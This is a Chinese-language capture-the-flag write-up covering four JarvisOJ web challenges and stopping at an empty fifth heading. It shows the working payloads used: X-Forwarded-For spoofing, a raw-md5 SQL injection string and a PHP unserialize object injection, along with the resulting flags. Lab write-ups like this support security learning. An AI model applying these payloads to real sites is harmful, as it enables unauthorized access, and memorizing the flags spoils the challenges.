### 0x00 PORT51
#### 题目
> 题目链接：http://web.jarvisoj.com:32770/

#### 思路
访问看到Please use port 51 to visit this site.

看前端代码没有发现问题

```
$ sudo curl web.jarvisoj.com:32770 --local-port 51
<!DOCTYPE html>
<html>
<head>
<title>Web 100</title>
<style type="text/css">
	body {
		background:gray;
		text-align:center;
	}
</style>
</head>

<body>
	<h3>Yeah!! Here's your flag:PCTF{M45t3r_oF_CuRl}</h3>
</body>
</html>
```

访问了多次，会返回两种结果，其中一种有flag，其他题目也有这个问题，多访问几次一般会flag的

#### flag
PCTF{M45t3r_oF_CuRl}


### 0x01 LOCALHOST
#### 题目
> 题目入口：http://web.jarvisoj.com:32774/

#### 思路
访问看到前端写了localhost access only!!

前端没有看到有用信息

```
$ curl http://web.jarvisoj.com:32774/ -H "X-FORWARDED-FOR:127.0.0.1"
<!DOCTYPE html>
<html>
<head>
<title>Web 150</title>
<style type="text/css">
	body {
		background:gray;
		text-align:center;
	}
</style>
</head>

<body>
	<h3>Yeah!! Here's your flag:PCTF{X_F0rw4rd_F0R_is_not_s3cuRe}</h3>
</body>
</html>
```

#### flag
PCTF{X_F0rw4rd_F0R_is_not_s3cuRe}

### 0x02 Login
#### 题目
> 需要密码才能获得flag哦。
> 题目链接：http://web.jarvisoj.com:32772/

#### 思路
访问就一个输入密码的表单，页面源码没有发现，在头部发现Hint头部`Hint: "select * from `admin` where password='".md5($pass,true)."'"`

想着估计是SQL注入，注入`1' OR 1=1 -- `没有成功

看到pass被md5过，感觉可能是不行的，除非md5后变成SQL注入的语句？

看别人writeup，php中`md5(string, raw)`，若`raw=true`，则返回的二进制转成ascii的数据

google搜索`sql injection php md5`发现了

```
content: 129581926211651571912466741651878684928
count:   18933549
hex:     06da5430449f8f6f23dfc1276f722738
raw:     ?T0D??o#??'or'8.N=?
```

#### flag
PCTF{R4w_md5_is_d4ng3rous}


### 0x03 神盾局的密码
#### 题目
> 这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？
> 题目入口：http://web.jarvisoj.com:32768/

#### 思路
访问看到图片，chrome开发者工具显示`/showimg.php?img=md值`，这里burp抓包的话会默认去掉图片看不到包

修改md5值为任意，可以看到返回
```
<br />
<b>Warning</b>:  readfile(showing.php): failed to open stream: No such file or directory in <b>/opt/lampp/htdocs/showimg.php</b> on line <b>7</b><br />
```

尝试把md5改成`/opt/lampp/htdocs/showimg.php`的md5，File not found!，改成`showimg.php`的md5

```
<?php
	$f = $_GET['img'];
	if (!empty($f)) {
		$f = base64_decode($f);
		if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\')===FALSE
		&& stripos($f,'pctf')===FALSE) {
			readfile($f);
		} else {
			echo "File not found!";
		}
	}
?>
```

一开始觉得是不是要绕过编码，造成任意文件读取，没成功，网上看是要看`index.php`，把md5改成`index.php`的md5

```
<?php 
	require_once('shield.php');
	$x = new Shield();
	isset($_GET['class']) && $g = $_GET['class'];
	if (!empty($g)) {
		$x = unserialize($g);
	}
	echo $x->readfile();
?>
<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>
```

再查看把md5改成`shield.php`的md5

```
<?php
	//flag is in pctf.php
	class Shield {
		public $file;
		function __construct($filename = '') {
			$this -> file = $filename;
		}
		
		function readfile() {
			if (!empty($this->file) && stripos($this->file,'..')===FALSE  
			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
				return @file_get_contents($this->file);
			}
		}
	}
?>
```

可以知道flag在`pctf.php`，但是pctf被检测了，`index.php`中有对class参数对反序列化处理，反序列话Shield类，所以序列话一个Shield类
```
<?php
class Shield {
        public $file;
        function __construct($filename = '') {
            $this -> file = $filename;
        }
    }
    $x = new Shield("pctf.php");
    echo serialize($x);
?>
```

得到`O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}`

访问`http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}`

```
<?php 
	//Ture Flag : PCTF{W3lcome_To_Shi3ld_secret_Ar3a}
	//Fake flag:
	echo "FLAG: PCTF{I_4m_not_fl4g}"
?>
<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>
```

这个True和False的Flag不知道哪里触发，页面不会显示出来

#### flag
PCTF{W3lcome_To_Shi3ld_secret_Ar3a}


### 0x04 IN A Mess

